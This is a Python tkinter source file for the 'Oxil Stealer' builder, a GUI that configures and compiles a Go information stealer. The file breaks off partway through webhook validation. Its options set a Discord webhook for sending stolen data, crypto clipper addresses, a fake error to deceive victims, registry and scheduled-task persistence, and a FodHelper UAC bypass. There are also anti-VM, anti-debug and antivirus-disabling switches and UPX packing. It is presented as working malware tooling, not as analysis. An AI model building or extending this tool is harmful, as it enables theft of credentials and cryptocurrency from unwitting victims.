#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Oxil Stealer - Builder GUI
Modern graphical interface to configure and compile the stealer
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import json
import re
import os
import subprocess
import shutil
import threading
import sys
from datetime import datetime

try:
    import requests
except ImportError:
    print("ERROR: The 'requests' library is not installed.")
    print("Run: pip install requests")
    sys.exit(1)

# Default configuration
CONFIG_FILE = "builder_config.json"
MAIN_GO_FILE = "main.go"
BACKUP_SUFFIX = ".backup"

# List of supported cryptocurrencies (matches main.go)
CRYPTOS = ["BTC", "BCH", "ETH", "XMR", "LTC", "XCH", "XLM", "TRX", "ADA", "DASH", "DOGE"]

# Modern color palette (red, dark)
COLORS = {
    "bg_primary": "#0d0a0d",
    "bg_secondary": "#1a151a",
    "bg_tertiary": "#2a1f2a",

    "accent_red": "#c0392b",       # Rouge plus foncé
    "accent_red_dark": "#a93226",  # Rouge très foncé
    "accent_red_light": "#e74c3c", # Rouge clair pour variantes

    "text_primary": "#eef1f2",     # un peu plus doux
    "text_secondary": "#b7bcc0",

    "success": "#2ecc71",
    "warning": "#f39c12",
    "error": "#c0392b"
}


class ModernStyle:
    """Modern style management"""
    @staticmethod
    def configure_styles(root):
        style = ttk.Style()
        
        # Color configuration for widgets
        style.theme_use('clam')
        
        # Frame style
        style.configure('Dark.TFrame', background=COLORS["bg_primary"])
        style.configure('Secondary.TFrame', background=COLORS["bg_secondary"])
        
        # LabelFrame style
        style.configure('Dark.TLabelframe', 
                       background=COLORS["bg_secondary"],
                       foreground=COLORS["text_primary"],
                       bordercolor=COLORS["accent_red"],
                       borderwidth=2)
        style.configure('Dark.TLabelframe.Label',
                       background=COLORS["bg_secondary"],
                       foreground=COLORS["accent_red"],
                       font=("Segoe UI", 10, "bold"))
        
        # Entry style
        style.configure('Dark.TEntry',
                       fieldbackground=COLORS["bg_tertiary"],
                       foreground=COLORS["text_primary"],
                       bordercolor=COLORS["accent_red"],
                       borderwidth=1,
                       insertcolor=COLORS["text_primary"])
        
        # Button styles
        style.configure('Primary.TButton',
                       background=COLORS["accent_red"],
                       foreground=COLORS["text_primary"],
                       borderwidth=0,
                       focuscolor='none',
                       padding=10)
        style.map('Primary.TButton',
                 background=[('active', COLORS["accent_red_dark"]),
                           ('pressed', COLORS["accent_red_dark"])],
                 foreground=[('active', COLORS["text_primary"]),
                           ('pressed', COLORS["text_primary"])])
        
        style.configure('Blue.TButton',
                       background=COLORS["accent_red_light"],
                       foreground=COLORS["text_primary"],
                       borderwidth=0,
                       focuscolor='none',
                       padding=8)
        style.map('Blue.TButton',
                 background=[('active', COLORS["accent_red"]),
                           ('pressed', COLORS["accent_red"])],
                 foreground=[('active', COLORS["text_primary"]),
                           ('pressed', COLORS["text_primary"])])
        
        style.configure('Secondary.TButton',
                       background=COLORS["bg_tertiary"],
                       foreground=COLORS["text_primary"],
                       borderwidth=0,
                       padding=8)
        style.map('Secondary.TButton',
                 background=[('active', COLORS["bg_secondary"]),
                           ('pressed', COLORS["bg_secondary"])],
                 foreground=[('active', COLORS["text_primary"]),
                           ('pressed', COLORS["text_primary"])])
        
        # Notebook style
        style.configure('Dark.TNotebook',
                       background=COLORS["bg_primary"],
                       borderwidth=0)
        style.configure('Dark.TNotebook.Tab',
                       background=COLORS["bg_secondary"],
                       foreground=COLORS["text_secondary"],
                       padding=[20, 10],
                       borderwidth=0)
        style.map('Dark.TNotebook.Tab',
                 background=[('selected', COLORS["accent_red"])],
                 foreground=[('selected', COLORS["text_primary"])])
        
        # Label style
        style.configure('Title.TLabel',
                       background=COLORS["bg_secondary"],
                       foreground=COLORS["text_primary"],
                       font=("Segoe UI", 16, "bold"))
        style.configure('Subtitle.TLabel',
                       background=COLORS["bg_secondary"],
                       foreground=COLORS["text_secondary"],
                       font=("Segoe UI", 10))
        style.configure('Dark.TLabel',
                       background=COLORS["bg_secondary"],
                       foreground=COLORS["text_primary"])


class OxilBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("Oxil Stealer - Builder")
        self.root.geometry("900x750")
        self.root.resizable(True, True)
        
        # Apply dark theme to main window
        self.root.configure(bg=COLORS["bg_primary"])
        
        # Change window icon if oxil.ico exists
        icon_path = os.path.join(os.getcwd(), "resources", "icons", "oxil.ico")
        if os.path.exists(icon_path):
            try:
                self.root.iconbitmap(icon_path)
            except Exception:
                pass  # If icon cannot be loaded, continue without
        
        # Variables
        self.webhook_url = tk.StringVar()
        self.webhook_valid = False
        self.crypto_addresses = {crypto: tk.StringVar() for crypto in CRYPTOS}
        self.hide_console = tk.BooleanVar(value=False)
        self.use_upx = tk.BooleanVar(value=False)
        self.output_name = tk.StringVar(value="oxil.exe")
        self.use_ldflags = tk.BooleanVar(value=True)
        self.enable_antivm = tk.BooleanVar(value=True)  # Anti-VM enabled by default
        self.enable_fakeerror = tk.BooleanVar(value=True)  # Fake error enabled by default
        self.icon_path = tk.StringVar(value="")  # Path to .ico file
        
        # Persistence options: separate checkboxes for each technique
        self.persistence_startup = tk.BooleanVar(value=True)  # Registry HKCU (user)
        self.persistence_admin = tk.BooleanVar(value=False)  # Registry HKLM (admin)
        self.persistence_task = tk.BooleanVar(value=False)  # Task Scheduler (user)
        
        # Elevation options: 0=None, 1=UAC Bypass (FodHelper), 2=Force Admin (manifest)
        self.elevation_mode = tk.IntVar(value=1)  # UAC Bypass by default
        
        # Security options
        self.enable_antidebug = tk.BooleanVar(value=True)  # Anti-debug enabled by default
        self.enable_antivirus = tk.BooleanVar(value=True)  # Anti-antivirus enabled by default
        
        # Logging system
        self.log_enabled = True
        
        # Modification state for tracking
        self.main_go_modified = False
        self.original_content = None
        
        # Configurer les styles
        ModernStyle.configure_styles(root)
        
        # Interface
        self.create_widgets()
        
        # Charger configuration si elle existe
        self.load_config()
        
        # Check if oxil.ico exists in resources/icons and use it by default
        oxil_icon_path = os.path.join(os.getcwd(), "resources", "icons", "oxil.ico")
        if os.path.exists(oxil_icon_path) and not self.icon_path.get():
            self.icon_path.set(oxil_icon_path)
        
        # Update icon preview after complete initialization
        self.root.after(100, lambda: [self.update_icon_preview(), self.update_icon_in_entry()])
        
        # Load original main.go content for backup
        self.load_original_main_go()
        
        # Initialize log with welcome message
        self.root.after(200, lambda: self.log_action("Oxil Stealer Builder initialized", "success"))
        
    def load_original_main_go(self):
        """Loads the original main.go content for backup"""
        if os.path.exists(MAIN_GO_FILE):
            try:
                with open(MAIN_GO_FILE, 'r', encoding='utf-8') as f:
                    self.original_content = f.read()
            except Exception:
                self.original_content = None
        
    def create_widgets(self):
        """Creates the user interface"""
        # Header
        header = tk.Frame(self.root, bg=COLORS["accent_red"], height=60)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        
        title_label = tk.Label(
            header,
            text="⚡ Oxil Stealer Builder",
            font=("Segoe UI", 20, "bold"),
            bg=COLORS["accent_red"],
            fg=COLORS["text_primary"]
        )
        title_label.pack(pady=15)
        
        # Notebook pour les onglets
        self.notebook = ttk.Notebook(self.root, style='Dark.TNotebook')
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        # Tab 1: Basic configuration
        self.create_basic_tab()
        
        # Tab 2: Crypto addresses
        self.create_crypto_tab()
        
        # Tab 3: Compilation options
        self.create_compile_tab()
        
        # Tab 4: Advanced options
        self.create_advanced_tab()
        
        # Bottom container for buttons, log, and credit
        bottom_container = tk.Frame(self.root, bg=COLORS["bg_primary"])
        bottom_container.pack(side=tk.BOTTOM, fill=tk.X, pady=(0, 0))
        
        # Creator credit (benzoXdev) - at the very bottom
        creator_label = tk.Label(
            bottom_container,
            text="Created by benzoXdev",
            bd=0,
            anchor=tk.CENTER,
            bg=COLORS["bg_primary"],
            fg=COLORS["text_secondary"],
            font=("Segoe UI", 8),
            pady=3
        )
        creator_label.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Main buttons (Build Project and Exit)
        button_container = tk.Frame(bottom_container, bg=COLORS["bg_primary"])
        button_container.pack(side=tk.BOTTOM, pady=(0, 5))
        self.create_action_buttons(button_container)
        
        # Log area (above buttons) - with its own scroll
        log_frame = ttk.LabelFrame(bottom_container, text="📋 Activity Log", style='Dark.TLabelframe', padding=10)
        log_frame.pack(side=tk.BOTTOM, fill=tk.BOTH, expand=False, padx=15, pady=(0, 5))
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            height=6,
            wrap=tk.WORD,
            bg=COLORS["bg_tertiary"],
            fg=COLORS["text_primary"],
            font=("Consolas", 9),
            insertbackground=COLORS["text_primary"],
            relief=tk.FLAT,
            borderwidth=0
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)
        
        # Bind mouse wheel events to scroll only this log
        def on_log_mousewheel(event):
            if event.delta:
                self.log_text.yview_scroll(int(-1 * (event.delta / 120)), "units")
            else:
                if event.num == 4:
                    self.log_text.yview_scroll(-1, "units")
                elif event.num == 5:
                    self.log_text.yview_scroll(1, "units")
            return "break"  # Prevent event propagation
        
        self.log_text.bind("<MouseWheel>", on_log_mousewheel)
        self.log_text.bind("<Button-4>", on_log_mousewheel)
        self.log_text.bind("<Button-5>", on_log_mousewheel)
        # Also bind to the frame to capture when mouse is over it
        log_frame.bind("<MouseWheel>", on_log_mousewheel)
        log_frame.bind("<Button-4>", on_log_mousewheel)
        log_frame.bind("<Button-5>", on_log_mousewheel)
        
        # Status bar (at bottom)
        self.status_bar = tk.Label(
            self.root,
            text="● Ready",
            bd=0,
            anchor=tk.W,
            bg=COLORS["bg_secondary"],
            fg=COLORS["text_secondary"],
            font=("Segoe UI", 9),
            padx=15,
            pady=8
        )
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
    def create_basic_tab(self):
        """Basic configuration tab"""
        frame = tk.Frame(self.notebook, bg=COLORS["bg_secondary"])
        self.notebook.add(frame, text="🎯 Webhook")
        
        container = tk.Frame(frame, bg=COLORS["bg_secondary"])
        container.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Titre
        title = tk.Label(
            container,
            text="Discord Webhook Configuration",
            font=("Segoe UI", 16, "bold"),
            bg=COLORS["bg_secondary"],
            fg=COLORS["text_primary"]
        )
        title.pack(pady=(0, 20))
        
        # Webhook URL
        webhook_frame = ttk.LabelFrame(container, text="Webhook URL", style='Dark.TLabelframe', padding=15)
        webhook_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(
            webhook_frame,
            text="Discord webhook URL:",
            bg=COLORS["bg_secondary"],
            fg=COLORS["text_primary"],
            font=("Segoe UI", 10)
        ).pack(anchor=tk.W, pady=(0, 8))
        
        entry_frame = tk.Frame(webhook_frame, bg=COLORS["bg_secondary"])
        entry_frame.pack(fill=tk.X, pady=5)
        
        self.webhook_entry = ttk.Entry(entry_frame, textvariable=self.webhook_url, style='Dark.TEntry', font=("Consolas", 10))
        self.webhook_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10), ipady=8)
        self.webhook_entry.bind('<KeyRelease>', self.on_webhook_change)
        
        # Indicateur de statut
        self.webhook_status = tk.Label(
            entry_frame,
            text="●",
            font=("Arial", 20),
            fg=COLORS["text_secondary"],
            bg=COLORS["bg_secondary"]
        )
        self.webhook_status.pack(side=tk.RIGHT, padx=5)
        
        # Bouton de validation
        validate_btn = ttk.Button(
            webhook_frame,
            text="🔍 Validate webhook",
            command=self.validate_webhook,
            style='Primary.TButton'
        )
        validate_btn.pack(pady=(10, 0))
        
        # Message area
        log_frame = ttk.LabelFrame(container, text="Validation Log", style='Dark.TLabelframe', padding=10)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.webhook_message = scrolledtext.ScrolledText(
            log_frame,
            height=6,
            wrap=tk.WORD,
            state=tk.DISABLED,
            bg=COLORS["bg_tertiary"],
            fg=COLORS["text_primary"],
            insertbackground=COLORS["text_primary"],
            font=("Consolas", 9),
            borderwidth=0,
            relief=tk.FLAT
        )
        self.webhook_message.pack(fill=tk.BOTH, expand=True)
        
        # Bind mouse wheel events to scroll only this log
        def on_webhook_log_mousewheel(event):
            if event.delta:
                self.webhook_message.yview_scroll(int(-1 * (event.delta / 120)), "units")
            else:
                if event.num == 4:
                    self.webhook_message.yview_scroll(-1, "units")
                elif event.num == 5:
                    self.webhook_message.yview_scroll(1, "units")
            return "break"  # Prevent event propagation
        
        self.webhook_message.bind("<MouseWheel>", on_webhook_log_mousewheel)
        self.webhook_message.bind("<Button-4>", on_webhook_log_mousewheel)
        self.webhook_message.bind("<Button-5>", on_webhook_log_mousewheel)
        # Also bind to the frame to capture when mouse is over it
        log_frame.bind("<MouseWheel>", on_webhook_log_mousewheel)
        log_frame.bind("<Button-4>", on_webhook_log_mousewheel)
        log_frame.bind("<Button-5>", on_webhook_log_mousewheel)
        
    def create_crypto_tab(self):
        """Tab for cryptocurrency addresses"""
        frame = tk.Frame(self.notebook, bg=COLORS["bg_secondary"])
        self.notebook.add(frame, text="💰 Crypto")
        
        container = tk.Frame(frame, bg=COLORS["bg_secondary"])
        container.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        title = tk.Label(
            container,
            text="Cryptocurrency Addresses (Clipper)",
            font=("Segoe UI", 16, "bold"),
            bg=COLORS["bg_secondary"],
            fg=COLORS["text_primary"]
        )
        title.pack(pady=(0, 10))
        
        # Frame scrollable
        canvas = tk.Canvas(container, bg=COLORS["bg_secondary"], highlightthickness=0)
        scrollbar = ttk.Scrollbar(container, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=COLORS["bg_secondary"])
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set, bg=COLORS["bg_secondary"])
        
        # Create fields for each crypto
        self.crypto_entries = {}
        for i, crypto in enumerate(CRYPTOS):
            row_frame = tk.Frame(scrollable_frame, bg=COLORS["bg_tertiary"], pady=5, padx=10)
            row_frame.pack(fill=tk.X, pady=3)
            
            label = tk.Label(
                row_frame,
                text=f"{crypto}:",
                width=8,
                anchor=tk.W,
                bg=COLORS["bg_tertiary"],
                fg=COLORS["accent_red"],
                font=("Segoe UI", 10, "bold")
            )
            label.pack(side=tk.LEFT, padx=(0, 10))
            
            entry = ttk.Entry(
                row_frame,
                textvariable=self.crypto_addresses[crypto],
                style='Dark.TEntry',
                font=("Consolas", 9)
            )
            entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=6)
            self.crypto_entries[crypto] = entry
        
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Action button
        button_frame = tk.Frame(container, bg=COLORS["bg_secondary"])
        button_frame.pack(pady=15)
        
        clear_btn = ttk.Button(
            button_frame,
            text="🗑️ Clear all addresses",
            command=self.clear_crypto,
            style='Secondary.TButton'
        )
        clear_btn.pack(side=tk.LEFT, padx=5)
        
    def create_compile_tab(self):
        """Compilation options tab"""
        frame = tk.Frame(self.notebook, bg=COLORS["bg_secondary"])
        self.notebook.add(frame, text="⚙️ Compilation")
        
        # Canvas avec scrollbar pour le contenu scrollable
        canvas = tk.Canvas(frame, bg=COLORS["bg_secondary"], highlightthickness=0)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=COLORS["bg_secondary"])
        
        def on_frame_configure(event):
            """Updates the scroll region when content changes"""
            canvas.configure(scrollregion=canvas.bbox("all"))
        
        def on_canvas_configure(event):
            """Adjusts the scrollable frame width to match the canvas width"""
            canvas_width = event.width
            canvas.itemconfig(canvas_window, width=canvas_width)
        
        scrollable_frame.bind("<Configure>", on_frame_configure)
        
        canvas_window = canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set, bg=COLORS["bg_secondary"])
        canvas.bind("<Configure>", on_canvas_configure)
        
        # Binding for mouse wheel scrolling (Windows/Linux)
        def on_mousewheel(event):
            canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
        canvas.bind_all("<MouseWheel>", on_mousewheel)
        
        container = scrollable_frame
        container.configure(bg=COLORS["bg_secondary"])
        
        title = tk.Label(
            container,
            text="Go Compilation Options",
            font=("Segoe UI", 16, "bold"),
            bg=COLORS["bg_secondary"],
            fg=COLORS["text_primary"]
        )
        title.pack(pady=(20, 20), padx=20)
        
        # Output file name
        output_frame = ttk.LabelFrame(container, text="Output File", style='Dark.TLabelframe', padding=15)
        output_frame.pack(fill=tk.X, pady=10, padx=20)
        
        tk.Label(
            output_frame,
            text="File name:",
            bg=COLORS["bg_secondary"],
            fg=COLORS["text_primary"]
        ).pack(anchor=tk.W, pady=(0, 8))
        
        ttk.Entry(output_frame, textvariable=self.output_name, style='Dark.TEntry', font=("Consolas", 10), width=40).pack(anchor=tk.W, ipady=6)
        
        # Icon with enlarged preview
        icon_frame = ttk.LabelFrame(container, text="Executable Icon", style='Dark.TLabelframe', padding=15)
        icon_frame.pack(fill=tk.X, pady=10, padx=20)
        
        # Icon preview (enlarged and separated)
        tk.Label(
            icon_frame,
            text="Icon Preview:",
            bg=COLORS["bg_secondary"],
            fg=COLORS["text_primary"],
            font=("Segoe UI", 10, "bold")
        ).pack(anchor=tk.W, pady=(0, 8))
        
        icon_preview_frame = tk.Frame(icon_frame, bg=COLORS["bg_secondary"])
        icon_preview_frame.pack(anchor=tk.W, pady=(0, 20))  # More space at bottom to separate from field
        
        # Canvas to display icon at fixed size (320x320 pixels)
        self.icon_preview_size = 320  # Size in pixels
        self.icon_preview_canvas = tk.Canvas(
            icon_preview_frame,
            width=self.icon_preview_size,
            height=self.icon_preview_size,
            bg=COLORS["bg_tertiary"],
            relief=tk.SUNKEN,
            borderwidth=2,
            highlightthickness=0
        )
        self.icon_preview_canvas.pack(side=tk.LEFT, padx=(0, 15))
        
        # Default text label (will be replaced by image)
        self.icon_preview_text = self.icon_preview_canvas.create_text(
            self.icon_preview_size // 2,
            self.icon_preview_size // 2,
            text="No icon",
            fill=COLORS["text_secondary"],
            font=("Segoe UI", 12)
        )
        
        # Update preview when icon changes (on input)
        self.icon_path.trace_add('write', lambda *args: self.root.after_idle(self.update_icon_preview))
        
        # Visual separator
        separator = tk.Frame(icon_frame, bg=COLORS["bg_tertiary"], height=2)
        separator.pack(fill=tk.X, pady=(10, 15))
        
        tk.Label(
            icon_frame,
            text="Icon File Path:",
            bg=COLORS["bg_secondary"],
            fg=COLORS["text_primary"],
            font=("Segoe UI", 10, "bold")
        ).pack(anchor=tk.W, pady=(0, 8))
        
        # Custom frame to display icon in field
        icon_entry_frame = tk.Frame(icon_frame, bg=COLORS["bg_tertiary"], relief=tk.SUNKEN, borderwidth=1)
        icon_entry_frame.pack(fill=tk.X, pady=5)
        
        # Label to display icon (left side in field)
        self.icon_entry_icon = tk.Label(
            icon_entry_frame,
            text="📄",
            bg=COLORS["bg_tertiary"],
            fg=COLORS["text_secondary"],
            width=4,
            font=("Segoe UI", 12)
        )
        self.icon_entry_icon.pack(side=tk.LEFT, padx=5, pady=3)
        
        # Entry for path (visually hidden but functional)
        entry_container = tk.Frame(icon_entry_frame, bg=COLORS["bg_tertiary"])
        entry_container.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        self.icon_entry = ttk.Entry(entry_container, textvariable=self.icon_path, style='Dark.TEntry', font=("Consolas", 9))
        self.icon_entry.pack(fill=tk.X, ipady=6)
        
        # Update icon in field when path changes
        self.icon_path.trace_add('write', lambda *args: self.root.after_idle(self.update_icon_in_entry))
        
        browse_icon_btn = ttk.Button(
            icon_entry_frame,
            text="📁 Browse...",
            command=self.browse_icon_file,
            style='Blue.TButton'
        )
        browse_icon_btn.pack(side=tk.RIGHT, padx=5, pady=3)
        
        clear_icon_btn = ttk.Button(
            icon_frame,
            text="🗑️ Clear icon",
            command=self.clear_icon,
            style='Secondary.TButton'
        )
        clear_icon_btn.pack(anchor=tk.W, pady=(5, 0))
        
        # Options de compilation
        options_frame = ttk.LabelFrame(container, text="Options", style='Dark.TLabelframe', padding=15)
        options_frame.pack(fill=tk.X, pady=10, padx=20)
        
        def create_checkbox(parent, text, variable, log_name=None):
            def on_toggle():
                state = "enabled" if variable.get() else "disabled"
                if log_name:
                    self.log_action(f"{log_name} {state}", "success" if variable.get() else "info")
            
            cb_frame = tk.Frame(parent, bg=COLORS["bg_secondary"])
            cb_frame.pack(anchor=tk.W, pady=5)
            cb = tk.Checkbutton(
                cb_frame,
                text=text,
                variable=variable,
                command=on_toggle,
                bg=COLORS["bg_secondary"],
                fg=COLORS["text_primary"],
                selectcolor=COLORS["accent_red"],
                activebackground=COLORS["bg_secondary"],
                activeforeground=COLORS["text_primary"],
                font=("Segoe UI", 10)
            )
            cb.pack(side=tk.LEFT)
            return cb
        
        create_checkbox(options_frame, "Use ldflags (-s -w) to reduce size", self.use_ldflags, "LDFlags")
        create_checkbox(options_frame, "Hide console (-H=windowsgui)", self.hide_console, "Hide Console")
        create_checkbox(options_frame, "Compress with UPX after compilation", self.use_upx, "UPX Compression")
        create_checkbox(options_frame, "Show fake error on startup (deceive user)", self.enable_fakeerror, "Fake Error")
        
        # Section Persistance avec checkboxes séparées
        persistence_frame = ttk.LabelFrame(container, text="🔄 Persistence (Auto-start) - Multiple techniques can be enabled", style='Dark.TLabelframe', padding=15)
        persistence_frame.pack(fill=tk.X, pady=10, padx=20)
        
        def create_persistence_checkbox(parent, text, variable, admin_required=False, log_name=None):
            """Creates a checkbox with admin warning if necessary"""
            def on_check():
                if variable.get() and admin_required:
                    if not messagebox.askyesno(
                        "⚠️ Administrator Option",
                        f"{text}\n\nThis option requires administrator rights to function.\n\nDo you want to continue?"
                    ):
                        variable.set(False)
                        return
                
                state = "enabled" if variable.get() else "disabled"
                if log_name:
                    self.log_action(f"Persistence: {log_name} {state}", "success" if variable.get() else "info")
            
            cb_frame = tk.Frame(parent, bg=COLORS["bg_secondary"])
            cb_frame.pack(anchor=tk.W, pady=3)
            
            # Icône admin (bouclier) si nécessaire
            if admin_required:
                admin_icon = tk.Label(cb_frame, text="🛡️", bg=COLORS["bg_secondary"], fg=COLORS["warning"], font=("Segoe UI", 10))
                admin_icon.pack(side=tk.LEFT, padx=(0, 5))
            
            cb = tk.Checkbutton(
                cb_frame,
                text=text,
                variable=variable,
                command=on_check,
                bg=COLORS["bg_secondary"],
                fg=COLORS["text_primary"],
                selectcolor=COLORS["accent_red"],
                activebackground=COLORS["bg_secondary"],
                activeforeground=COLORS["text_primary"],
                font=("Segoe UI", 10)
            )
            cb.pack(side=tk.LEFT)
            return cb
        
        create_persistence_checkbox(persistence_frame, "Windows Registry (HKCU\\...\\Run) - Stealth (User)", self.persistence_startup, admin_required=False, log_name="Registry (HKCU)")
        create_persistence_checkbox(persistence_frame, "System Registry (HKLM\\...\\Run) - Advanced (Admin)", self.persistence_admin, admin_required=True, log_name="Registry (HKLM)")
        create_persistence_checkbox(persistence_frame, "Windows Scheduled Task (Task Scheduler) - Advanced (User)", self.persistence_task, admin_required=False, log_name="Task Scheduler")
        
        # Section Élévation de privilèges avec icône admin
        elevation_frame = ttk.LabelFrame(container, text="🛡️ Privilege Elevation (Admin)", style='Dark.TLabelframe', padding=15)
        elevation_frame.pack(fill=tk.X, pady=10, padx=20)
        
        def create_elevation_radio(parent, text, variable, value, admin_required=False, log_name=None):
            """Creates a radio button with admin warning if necessary"""
            def on_select():
                if variable.get() == value and admin_required:
                    if not messagebox.askyesno(
                        "⚠️ Administrator Option",
                        f"{text}\n\nThis option requires administrator rights to function.\n\nDo you want to continue?"
                    ):
                        # Retourner à l'option précédente (0)
                        variable.set(0)
                        return
                
                if variable.get() == value and log_name:
                    self.log_action(f"Elevation: {log_name} enabled", "success")
            
            rb_frame = tk.Frame(parent, bg=COLORS["bg_secondary"])
            rb_frame.pack(anchor=tk.W, pady=3)
            
            if admin_required:
                admin_icon = tk.Label(rb_frame, text="🛡️", bg=COLORS["bg_secondary"], fg=COLORS["warning"], font=("Segoe UI", 10))
                admin_icon.pack(side=tk.LEFT, padx=(0, 5))
            
            rb = tk.Radiobutton(
                rb_frame,
                text=text,
                variable=variable,
                value=value,
                command=on_select,
                bg=COLORS["bg_secondary"],
                fg=COLORS["text_primary"],
                selectcolor=COLORS["accent_red"],
                activebackground=COLORS["bg_secondary"],
                activeforeground=COLORS["text_primary"],
                font=("Segoe UI", 10)
            )
            rb.pack(side=tk.LEFT)
            return rb
        
        create_elevation_radio(elevation_frame, "No elevation (user rights)", self.elevation_mode, 0, admin_required=False, log_name="None")
        create_elevation_radio(elevation_frame, "UAC Bypass (FodHelper) - Silent", self.elevation_mode, 1, admin_required=True, log_name="UAC Bypass")
        create_elevation_radio(elevation_frame, "Force Admin launch (UAC prompt)", self.elevation_mode, 2, admin_required=True, log_name="Force Admin")
        
        # Section Sécurité / Évasion
        security_frame = ttk.LabelFrame(container, text="🔒 Security & Evasion", style='Dark.TLabelframe', padding=15)
        security_frame.pack(fill=tk.X, pady=10, padx=20)
        
        create_checkbox(security_frame, "Enable anti-VM detection (exits if VM detected)", self.enable_antivm, "Anti-VM")
        create_checkbox(security_frame, "Enable anti-debug (detects debuggers)", self.enable_antidebug, "Anti-Debug")
        create_checkbox(security_frame, "Enable anti-antivirus (attempts to disable AV)", self.enable_antivirus, "Anti-Antivirus")
        
        # Compilation log window
        log_frame = ttk.LabelFrame(container, text="Compilation Log", style='Dark.TLabelframe', padding=10)
        log_frame.pack(fill=tk.X, pady=10, padx=20)
        
        self.compile_log = scrolledtext.ScrolledText(
            log_frame,
            height=12,
            wrap=tk.WORD,
            state=tk.DISABLED,
            bg=COLORS["bg_tertiary"],
            fg=COLORS["text_primary"],
            insertbackground=COLORS["text_primary"],
            font=("Consolas", 9),
            borderwidth=0,
            relief=tk.FLAT
        )
        self.compile_log.pack(fill=tk.BOTH, expand=True)
        
        # Bind mouse wheel events to scroll only this log
        def on_compile_log_mousewheel(event):
            if event.delta:
                self.compile_log.yview_scroll(int(-1 * (event.delta / 120)), "units")
            else:
                if event.num == 4:
                    self.compile_log.yview_scroll(-1, "units")
                elif event.num == 5:
                    self.compile_log.yview_scroll(1, "units")
            return "break"  # Prevent event propagation
        
        self.compile_log.bind("<MouseWheel>", on_compile_log_mousewheel)
        self.compile_log.bind("<Button-4>", on_compile_log_mousewheel)
        self.compile_log.bind("<Button-5>", on_compile_log_mousewheel)
        # Also bind to the frame to capture when mouse is over it
        log_frame.bind("<MouseWheel>", on_compile_log_mousewheel)
        log_frame.bind("<Button-4>", on_compile_log_mousewheel)
        log_frame.bind("<Button-5>", on_compile_log_mousewheel)
        
        # Pack canvas and scrollbar
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
    def create_advanced_tab(self):
        """Advanced options tab"""
        frame = tk.Frame(self.notebook, bg=COLORS["bg_secondary"])
        self.notebook.add(frame, text="🔧 Advanced")
        
        container = tk.Frame(frame, bg=COLORS["bg_secondary"])
        container.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        title = tk.Label(
            container,
            text="Configuration Management",
            font=("Segoe UI", 16, "bold"),
            bg=COLORS["bg_secondary"],
            fg=COLORS["text_primary"]
        )
        title.pack(pady=(0, 20))
        
        # Configuration buttons
        config_frame = ttk.LabelFrame(container, text="Configuration", style='Dark.TLabelframe', padding=15)
        config_frame.pack(fill=tk.X, pady=10)
        
        buttons = [
            ("💾 Save configuration", self.save_config),
            ("📂 Load configuration", self.load_config_dialog),
            ("🔄 Reset to default", self.reset_config),
        ]
        
        for text, command in buttons:
            btn = ttk.Button(config_frame, text=text, command=command, style='Secondary.TButton', width=30)
            btn.pack(pady=5, fill=tk.X)
        
        # Fichiers
        files_frame = ttk.LabelFrame(container, text="File Management", style='Dark.TLabelframe', padding=15)
        files_frame.pack(fill=tk.X, pady=10)
        
        btn_backup = ttk.Button(files_frame, text="💾 Create backup of main.go", command=self.backup_main_go, style='Secondary.TButton', width=30)
        btn_backup.pack(pady=5, fill=tk.X)
        
        btn_restore = ttk.Button(files_frame, text="↩️ Restore main.go from backup", command=self.restore_main_go, style='Secondary.TButton', width=30)
        btn_restore.pack(pady=5, fill=tk.X)
        
    def create_action_buttons(self, parent):
        """Creates the main action buttons"""
        button_frame = tk.Frame(parent, bg=COLORS["bg_primary"])
        button_frame.pack(pady=(0, 5))
        
        self.build_btn = ttk.Button(
            button_frame,
            text="🔨 Build Project",
            command=self.build_project,
            style='Primary.TButton'
        )
        self.build_btn.pack(side=tk.LEFT, padx=5)
        
        quit_btn = ttk.Button(
            button_frame,
            text="❌ Quit",
            command=self.on_closing,
            style='Secondary.TButton'
        )
        quit_btn.pack(side=tk.LEFT, padx=5)
        
        # Handle window closing
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
    def on_closing(self):
        """Handles window closing"""
        if self.main_go_modified and self.original_content:
            if messagebox.askyesno(
                "Restore main.go?",
                "main.go has been modified. Do you want to restore it to its original state?"
            ):
                try:
                    with open(MAIN_GO_FILE, 'w', encoding='utf-8') as f:
                        f.write(self.original_content)
                except Exception as e:
                    messagebox.showerror("Error", f"Unable to restore main.go:\n{str(e)}")
        
        self.root.quit()
        
    # ============================================
    # Validation methods
    # ============================================
    
    def on_webhook_change(self, event=None):
        """Called when the webhook URL changes"""
        url = self.webhook_url.get().strip()
        if url:
            if url.startswith("https://discord.com/api/webhooks/") or url.startswith("https://discordapp.com/api/webhooks/"):
                self.webhook_status.config(fg=COLORS["warning"])
                self.webhook_valid = False
            else:
